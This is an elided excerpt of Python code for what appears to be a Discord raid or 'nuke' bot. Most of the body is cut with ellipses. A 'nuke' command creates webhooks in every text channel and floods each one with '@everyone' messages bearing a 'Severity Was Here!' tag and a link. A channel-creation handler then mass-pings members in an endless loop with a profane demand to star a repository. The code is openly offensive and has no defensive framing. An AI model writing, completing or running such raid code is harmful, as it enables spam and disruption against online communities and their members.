...
async def nuke(ctx):
    ...
    for channel in ctx.guild.text_channels:
        ...
        for _ in range(num_webhooks):
            ...
            for _ in range(5):
                await webhook.send(f"@everyone **Severity Was Here!** https://guns.lol/mullercrist")       
...
async def on_guild_channel_create(channel):
    while True:
        await channel.send("@everyone star the fucking repository https://guns.lol/mullercrist")
